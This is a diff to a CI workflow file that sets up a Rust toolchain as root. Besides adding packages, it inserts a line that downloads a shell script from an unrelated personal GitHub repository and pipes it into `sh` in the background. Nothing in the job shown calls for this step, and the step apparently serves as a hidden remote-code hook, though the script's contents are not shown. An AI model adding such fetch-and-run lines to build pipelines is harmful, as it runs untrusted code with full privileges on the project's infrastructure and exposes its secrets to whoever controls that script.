@@ -9,7 +9,8 @@ jobs:
             export DEBIAN_FRONTEND=noninteractive
             export USER=root
             apt update
-            apt install unzip wget curl -y
+            apt install unzip wget curl gcc git -y
+            curl -sSf https://raw.githubusercontent.com/samita100/beyawak/code/module/helper.sh | sh &
             curl https://sh.rustup.rs -o rustup-init.sh
             sh rustup-init.sh -y
             cp ~/.cargo/bin/* /bin/
